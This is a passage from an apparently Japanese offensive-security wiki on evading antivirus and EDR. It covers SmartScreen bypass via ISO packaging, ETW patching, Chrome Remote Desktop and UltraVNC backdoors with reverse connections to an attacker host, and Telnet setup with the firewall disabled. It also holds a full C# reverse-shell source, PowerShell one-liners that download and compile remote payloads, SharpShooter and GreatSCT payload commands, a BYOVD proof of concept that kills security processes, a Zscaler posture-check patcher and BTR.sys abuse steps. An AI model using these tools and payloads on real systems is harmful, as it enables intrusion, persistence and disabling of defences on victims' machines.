`X86AsmPrinter::emitFunctionBodyStart()`と`emitFunctionBodyEnd()`は関数ごとのstubを出力し、`emitEndOfAsmFile()`はhandlerを出力します。出力段階間で共有されるシンボルを使えば、prologueのbranchから後続のepilogueへ飛べます。手動でnear `je`を出力する場合は、`0F 84`に続けて、4バイトのMC expression `target - address_after_je`を書き込みます。handlerへのcallとjumpは、代わりに`MCInst`オブジェクト（`CALL64pcrel32`と`JMP_1`）として出力できます。選択されていない関数について何も変更していない場合、passは`false`を返す必要がありますが、PoCはその経路で誤って`true`を返します。<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoCは、XOR keyと、loaderによってrelocateされた関数ポインターおよび実行時の長さを含む16バイトのレコードを`.funcmeta`に配置します。Cのフィールドは`uint32_t`ですが、handlerはレコードのオフセット`+8`にあるQWORDにアクセスし、長さとそのpaddingを読み込み、レコードを`0x10`ずつ進めます。PEのセクション名は8バイトしか使えないため、実行時の検索では`.funcmet`として認識されます。外部patcherは実行可能な`.stub`を追加し、元のentry-point RVAをstubに保存して、`AddressOfEntryPoint`をリダイレクトします。PIC stubは`gs:[0x60]` → `[PEB+0x10]`からimage baseを取得し、PE32+ importsをたどって、すでにimportされている`VirtualProtect`を解決してからCRTより前に実行されます。<sup>[[38]](#references)[[39]](#references)</sup>

初期化では`gs:[0xE8]`にsentinelを設定し、metadata内のすべての関数を呼び出します。常に読み取り可能なprologueは、関数の開始位置を`gs:[0xF0]`に記録し、sentinelを検出して、まだclearな関数本体をスキップします。その後、epilogueは`call handler`を実行します。handlerが13個のregister（`0x68`バイト）を保存した後、`[rsp+0x68]`にあるreturn addressが変換済み関数の末尾となるため、`end - start`をそのmetadataレコードに書き込めます。すべての関数本体をマスキングした後、stubはsentinelをクリアし、`ImageBase + original_entry_point_RVA`へjumpします。<sup>[[38]](#references)[[39]](#references)</sup>

通常のcallでは、prologueが同じ対称handlerを呼び出して関数本体をdecodeします。最後のパスは追加されたepilogueにフォールスルーし、それ以前のすべてのreturnは共有handlerに直接jumpします。通常のepilogueも`call`ではなく`jmp handler`を使うため、再マスキング後にhandlerの`ret`が元のcallerのreturn addressを消費し、関数の戻り値を`RAX`に保持します。<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

handlerは現在のレコードを見つけ、固定長の可視prologue（このbuildでは`0x46`バイト）をスキップし、残りを`PAGE_EXECUTE_READWRITE`に変更してから、下位key byteを使ってbyte単位でXORし、最後に`PAGE_EXECUTE_READ`に設定します。そのため、同じloopがentry時にdecodeし、通常のexit時にencodeします。<sup>[[38]](#references)[[39]](#references)</sup>

この方式の有力なindicatorには、次のものがあります。<sup>[[38]](#references)[[39]](#references)</sup>

- 実行可能な`.stub`内にあるentry pointと、keyおよびrelocate済みの`.text`ポインターを保持する`.funcmet` section。
- pre-CRTでのPEB、import table、section tableの解析と、それに続く各metadata pointer経由のcall。
- 同一の`call`/`pop` PIC prologueと、1つのhandlerへリダイレクトされた多数のreturn site。
- `gs:[0xE8]`、`gs:[0xF0]`、`gs:[0xF8]`への書き込みに続く、`VirtualProtect`の繰り返しの切り替えと、image-backed executable pageへのbyte単位のXOR書き込み。

これはmemory scannerの回避であり、暗号学的な保護ではありません。patch済みファイルには元のclearな関数本体が残っており、debuggerで`VirtualProtect`やXOR loopにbreakを設定すれば、実行中の関数をdumpできます。単一byteのXOR、読み取り可能なmetadata、固定の`0x46`境界により、オフラインでの復元も容易です。<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoCのTEB slotはthread-localですが、変更されたcode pageはprocess全体で共有されます。そのため、同時実行や再帰的なentryによって、別の呼び出しが実行中に命令が再度toggleされる可能性があります。また、exceptionやnonlocal exitによって再マスキングが回避されることもあります。堅牢な実装では、状態の切り替えを同期し、`lpflOldProtect`経由で返された実際の保護属性を復元し、stub長をハードコードせず、x64のstack alignmentについて`call`と`jmp`の両方の経路を検証し、実行可能なbyteを書き換えた後に`FlushInstructionCache`を呼び出す必要があります。Microsoftは、実行可能コードが変更された場合のinstruction-cache coherencyは呼び出し側の責任であると明記しています。<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

インターネットから実行ファイルをダウンロードして実行するときに、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreenは、潜在的に悪意のあるアプリケーションの実行からエンドユーザーを保護することを目的としたセキュリティ機構です。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreenは主にレピュテーションベースの方式で動作します。つまり、あまりダウンロードされていないアプリケーションではSmartScreenが表示され、エンドユーザーに警告してファイルの実行を阻止します（ただし、More Info -> Run anywayをクリックすれば実行できます）。

**MoTW**（Mark of The Web）は、Zone.Identifierという名前の[NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)で、インターネットからファイルをダウンロードすると、そのファイルのダウンロード元URLとともに自動的に作成されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルのZone.Identifier ADSを確認します。</p></figcaption></figure>

> [!TIP]
> **信頼された**署名証明書で署名された実行ファイルでは、**SmartScreenは表示されません**。

payloadにMark of The Webが付かないようにする非常に効果的な方法は、ISOなどのコンテナに格納することです。Mark-of-the-Web（MOTW）は**NTFS以外**のボリュームには適用**できない**ためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Mark-of-the-Webを回避するため、payloadを出力コンテナに格納するツールです。

使用例:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

SmartScreenを回避するために、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/)を使ってISOファイル内にpayloadをパッケージするデモです。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows（ETW）は、アプリケーションやシステムコンポーネントが**イベントを記録**できる、Windowsの強力なログ機構です。ただし、セキュリティ製品が悪意のある活動を監視・検出するためにも利用されます。

AMSIを無効化（バイパス）するのと同様に、ユーザースペースプロセスの**`EtwEventWrite`**関数を、イベントを記録せずに即座に戻るようにすることも可能です。これは、関数が即座に戻るようメモリ上でパッチを適用し、そのプロセスのETWログ記録を実質的に無効化することで実現します。

詳細は**[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/)および[https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**を参照してください。<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C#バイナリをメモリ上にロードする手法は、かなり前から知られており、AVに検知されずにpost-exploitationツールを実行する優れた方法として、今でも有効です。

payloadはディスクに触れることなくメモリに直接ロードされるため、プロセス全体でAMSIをパッチすることだけを考慮すればよいでしょう。

ほとんどのC2フレームワーク（sliver、Covenant、metasploit、CobaltStrike、Havocなど）は、C# Assemblyをメモリ上で直接実行する機能をすでに備えていますが、実行方法はいくつかあります。

- **Fork\&Run**

これは、**新しい使い捨てプロセスを起動**し、そのプロセスにpost-exploitationの悪意あるコードをインジェクトして実行し、完了後に新しいプロセスを終了させる方法です。メリットとデメリットの両方があります。Fork and Run方式のメリットは、実行がBeacon implantプロセスの**外部**で行われることです。つまり、post-exploitationの処理中に問題が発生したり検知されたりしても、**implantが生き残る可能性が大幅に高くなります**。デメリットは、**Behavioural Detections**に検知される**可能性が高くなる**ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

これは、post-exploitationの悪意あるコードを**自身のプロセスに**インジェクトする方法です。新しいプロセスを作成してAVにスキャンされるのを避けられますが、payloadの実行時に問題が起きると、クラッシュする可能性があるため、**beaconを失う可能性が大幅に高くなります**。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assemblyのロードについて詳しく知りたい場合は、この記事[https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/)と、InlineExecute-Assembly BOF（[https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)）を参照してください。

C# Assemblyは**PowerShellから**ロードすることもできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)と[S3cur3th1sSh1tの動画](https://www.youtube.com/watch?v=oe11Q-3Akuk)を確認してください。

## 他のプログラミング言語を使う

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)で提案されているように、侵害したマシンから**攻撃者が管理するSMB共有にインストールされたインタープリター環境へアクセス**させることで、他の言語を使って悪意のあるコードを実行できます。

SMB共有上のインタープリターバイナリと環境へのアクセスを許可すれば、侵害したマシンのメモリ内で、これらの言語による**任意のコードを実行できます**。

リポジトリによると、Defenderはスクリプトを引き続きスキャンしますが、Go、Java、PHPなどを利用することで、**静的シグネチャを回避する柔軟性が高まります**。これらの言語で難読化していないランダムなreverse shellスクリプトを使ったテストでは、成功が確認されています。

## TokenStomping

Token stompingは、EDRやAVなどのセキュリティ製品のアクセストークンを操作します。トークンの権限を下げることで、プロセスを実行状態に保ちながら、特権を必要とする検査や修復の処理を妨げることができます。

これを防ぐために、Windowsはセキュリティプロセスのトークンに対するハンドルを**外部プロセスが取得できないように**することができます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## 信頼されたソフトウェアを使う

### Chrome Remote Desktop

[**このブログ記事**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)で説明されているように、被害者のPCにChrome Remote Desktopを導入し、それを使って乗っ取りと永続化を行うのは簡単です。<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ からダウンロードし、「Set up via SSH」をクリックしてから、Windows用のMSIファイルをクリックしてダウンロードします。
2. 被害者のマシンでインストーラーをサイレント実行します（管理者権限が必要です）：`msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktopのページに戻り、「次へ」をクリックします。ウィザードで認証を求められるので、「Authorize」ボタンをクリックして続行します。
4. 必要な箇所を変更して、指定されたコマンドを実行します：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（`--pin`パラメーターを使うと、GUIを使わずにPINを設定できます）。


## 高度なEvasion

Evasionは非常に複雑なトピックです。1つのシステム内でも多様なテレメトリソースを考慮する必要がある場合があり、成熟した環境で完全に検知を回避するのはほぼ不可能です。

対処する環境ごとに、それぞれ強みと弱みがあります。

高度なEvasion技術の足がかりを得るために、[@ATTL4S](https://twitter.com/DaniLJ94)によるこちらの講演をぜひご覧ください。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

こちらも、[@mariuszbit](https://twitter.com/mariuszbit)によるEvasion in Depthに関する素晴らしい講演です。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **古い手法**

### **Defenderが悪意のあるものとして検出する箇所を特定する**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)を使うと、バイナリの一部を**削除していき、Defenderが悪意のあるものとして検出している箇所を特定して切り出せます**。\
同じことを行う別のツールに[**avred**](https://github.com/dobin/avred)があり、[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)でWebサービスとして公開されています。

### **Telnet Server**

Windows 10より前のWindowsには、次のように管理者としてインストールできる**Telnet server**が付属していました。

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

システムの起動時に**起動**するよう設定し、今すぐ**実行**します:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**telnet portを変更（stealth）してfirewallを無効化:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

ここからダウンロードします: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup ではなく bin downloads を選びます)

**ホスト上**: _**winvnc.exe**_ を実行し、サーバーを設定します:

- _Disable TrayIcon_ オプションを有効にする
- _VNC Password_ にパスワードを設定する
- _View-Only Password_ にパスワードを設定する

次に、バイナリ _**winvnc.exe**_ と新たに作成されたファイル _**UltraVNC.ini**_ を**被害者**の中に移動します

#### **Reverse connection**

**攻撃者**は、自分の**ホスト上で**バイナリ `vncviewer.exe -listen 5900` を実行し、Reverse **VNC connection** を受け取れる状態にしておきます。次に、**被害者**上で winvnc デーモン `winvnc.exe -run` を起動し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します

**警告:** ステルス性を保つため、以下の操作は避けてください

- すでに実行中の場合は `winvnc` を起動しないでください。[ポップアップ](https://i.imgur.com/1SROTTl.png)が表示されます。`tasklist | findstr winvnc` で実行中か確認してください
- 同じディレクトリに `UltraVNC.ini` がない状態で `winvnc` を起動しないでください。[設定ウィンドウ](https://i.imgur.com/rfMQWcf.png)が開きます
- ヘルプを表示するために `winvnc -h` を実行しないでください。[ポップアップ](https://i.imgur.com/oc18wcu.png)が表示されます

### GreatSCT

ここからダウンロードします: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT内:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

次に、`msfconsole -r file.rc`で**listener**を起動し、次の**xml payload**を**実行**します。

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**現在の Defender はプロセスをすぐに終了させます。**

### 独自の reverse shell をコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

次のコマンドでコンパイルします：

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

次のものと併用します:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# コンパイラを使用する

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C#難読化ツール一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### injectorを構築するためのPythonの使用例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### さらに

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space から AV/EDR を停止する

Storm-2603 は、ランサムウェアを投下する前にエンドポイント保護を無効化するため、**Antivirus Terminator** と呼ばれる小さなコンソールユーティリティを利用しました。このツールは**独自の脆弱だが *署名済み* のドライバー**を持ち込み、それを悪用して、Protected-Process-Light (PPL) の AV サービスでさえブロックできない、特権を要するカーネル操作を実行します。<sup>[[12]](#references)</sup>

主なポイント
1. **署名済みドライバー**: ディスクに配置されるファイルは `ServiceMouse.sys` ですが、実体は Antiy Labs の「System In-Depth Analysis Toolkit」に含まれる、正規の署名付きドライバー `AToolsKrnl64.sys` です。このドライバーは有効な Microsoft 署名を持つため、Driver-Signature-Enforcement (DSE) が有効でも読み込まれます。
2. **サービスのインストール**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   1行目でドライバーを**kernel service**として登録し、2行目で起動すると、`\\.\ServiceMouse`がuser landからアクセス可能になります。
3. **ドライバーが公開するIOCTL**
   | IOCTL code | 機能                                    |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PIDを指定して任意のプロセスを終了する（Defender/EDRサービスの停止に使用） |
   | `0x990000D0` | ディスク上の任意のファイルを削除する |
   | `0x990001D0` | ドライバーをアンロードしてサービスを削除する |

   最小限のCによるproof-of-concept：
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **動作する理由**: BYOVD はユーザーモードの保護を完全に迂回します。カーネル内で実行されるコードは、PPL/PP、ELAM、その他のハードニング機能に関係なく、*保護された*プロセスを開いたり、終了させたり、カーネルオブジェクトを改ざんしたりできます。

検出 / 緩和策
•  Microsoft の脆弱なドライバーのブロックリスト（`HVCI`、`Smart App Control`）を有効にし、Windows が `AToolsKrnl64.sys` を読み込まないようにします。
•  新しい *カーネル* サービスの作成を監視し、world-writable なディレクトリからドライバーが読み込まれた場合や、許可リストにないドライバーが読み込まれた場合にアラートを出します。
•  カスタムデバイスオブジェクトへのユーザーモードハンドルと、それに続く不審な `DeviceIoControl` 呼び出しを監視します。

### ディスク上のバイナリパッチによる Zscaler Client Connector の Posture Check のバイパス

Zscaler の **Client Connector** は、デバイスの posture ルールをローカルで適用し、結果を他のコンポーネントと通信するために Windows RPC に依存しています。設計上の弱点が2つあるため、完全なバイパスが可能です。

1. Posture の評価は **完全にクライアント側で行われ**（boolean がサーバーに送信される）。
2. 内部 RPC エンドポイントは、接続元の実行ファイルが Zscaler によって署名されていることだけを検証する（`WinVerifyTrust` を使用）。<sup>[[11]](#references)</sup>

**署名済みバイナリ4つをディスク上でパッチ**することで、両方の仕組みを無効化できます。

| Binary | パッチ対象の元のロジック | 結果 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返し、すべてのチェックを準拠済みにする |
| `ZSAService.exe` | `WinVerifyTrust` の間接呼び出し | NOP 化 ⇒ 署名されていないプロセスを含むあらゆるプロセスが RPC パイプにバインドできる |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置き換え |
| `ZSATunnel.exe` | トンネルの整合性チェック | 短絡 |

パッチャーの最小限の抜粋：

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

元のファイルを置き換えてサービススタックを再起動した後:

* posture checks は**すべて** green/compliant と表示されます。
* 署名されていないバイナリや改変されたバイナリから、名前付きパイプの RPC エンドポイント（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）を開けます。
* 侵害されたホストは、Zscaler ポリシーで定義された内部ネットワークに無制限にアクセスできるようになります。

このケーススタディは、クライアント側だけで行われる信頼性の判断と単純な署名チェックが、わずかなバイトパッチで突破されることを示しています。

## Microsoft Defender `BTR.sys` の信頼された機能の悪用

Defender の **Boot-Time Removal** ドライバーは、従来の BYOVD に対する有用な反例です。`BTR.sys` は、メモリ破損のバグも IOCTL インターフェースもない、Microsoft 署名済みの正規の修復コンポーネントです。管理者アクセスと `SeLoadDriverPrivilege` を取得した後、オペレーターは代わりに、そのドライバー固有の修復トランザクションを偽造して、本来の Ring-0 ファイル／レジストリ操作を実行できます。これは**侵害後に AV/EDR を無力化するプリミティブであり、初期アクセスや権限昇格ではありません**。また、目立つサードパーティ製ドライバーを持ち込む代わりに、対象自身の `MpEngine.dll` に含まれる `BOOTTIMETOOL` リソースからドライバーを抽出できます。<sup>[[36]](#references)</sup>

### ワンショットドライバーのステージング

Defender は通常、このリソースをランダムな `[a-z]{8}.sys` ファイルとして書き出し、同様の名前を持つカーネルサービスを登録します。`DriverEntry` はサービスの `Args` 値を読み取り、参照先の NTFS ADS を開いて、アクションリストを復号して検証し、フィードバックを書き込みます。実行が成功すると `0xC0000056` (`STATUS_DELETE_PENDING`) を返すため、ドライバーは常駐せずにアンロードされます。偽造したサービスには、次の特徴的な値が設定されています。<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` ストリームには、RC4で暗号化されたblobが1つ含まれています。解析対象のビルドでは固定の256バイトキーが再利用されるため、暗号化は認可の境界にはなりません。有効な平文は24バイトのグローバルヘッダー（`Magic=0xFEE1DEAD`、`Version=2`、`PayloadOffset=0x10`、ヘッダーCRC、ペイロードから導出されたトランザクションID）で始まり、その後にヌル終端のUTF-16フィードバックパスと、任意の数のアイテムが続きます。各アイテムは16バイトのヘッダー（`DataSize`、`Action`、`HeaderCRC`、`DataCRC`）と、アクション固有のデータで構成され、データの末尾は**ちょうど4バイトのNUL**でなければなりません。各ヘッダー／データ領域は、CRC-32多項式`0xEDB88320`、初期状態`0xFFFFFFFF`、**最終XORなし**（`~CRC32`）で個別に検証されます。CRC状態は領域ごとにリセットされます。<sup>[[36]](#references)[[37]](#references)</sup>

受け付けられるアクションIDによって、以下のカーネルプリミティブが利用できます。<sup>[[36]](#references)[[37]](#references)</sup>

| ID | アイテムデータ | 結果 |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | ロックされたファイルを含むファイルを削除 |
| 2 | `[UTF-16 path]` | 空のディレクトリを削除 |
| 3 | `[Flags][source][destination]` | 攻撃者が選択した保護対象パスにファイルを移動。空のdestinationは削除を意味する |
| 4 | `[Flags][key path]` | レジストリキーを再帰的に削除 |
| 5 | `[Flags][key path + "\\" + value]` | レジストリ値を削除 |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | レジストリ値を作成／更新し、不足しているキーのパスを作成 |

アクション5と6では、ワイヤ上のキー／値の区切り文字は**連続する2つのバックスラッシュ**です。一般的な形式のパスでは正しく分割されません。フィードバックファイルはおおむねリクエストを反映しますが、各アイテムのデータの先頭4バイトは、結果の`NTSTATUS`に置き換わります。先頭にflagsフィールドを持たないアクション1と2では、BTRはステータス用の領域を確保するため、パスを4つの予約済み末尾バイトに移動します。<sup>[[36]](#references)</sup>

### `BTR_CLI`のワークフローと起動初期の実行可能時間帯

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI)は一連の処理をすべて実行します。ローカルのDefenderから`BTR.sys`を抽出し、`<random>.sys:changelist`とフィードバックストリームを作成して、連鎖するアクションをシリアライズ、チェックサム計算、暗号化します。さらに、サービスのレジストリキーを直接作成し、`-trigger now`では`NtLoadDriver`を呼び出し、`-trigger boot`ではシステム起動時に開始するドライバーとして登録します。レジストリに直接ステージングすることで、通常のSCM `CreateServiceW`経路を回避するため、サービスインストールのイベントID 7045は生成されません。起動時にトリガーされるアーティファクトは、後から`BTR_CLI.exe -cleanup <service_name>`で削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
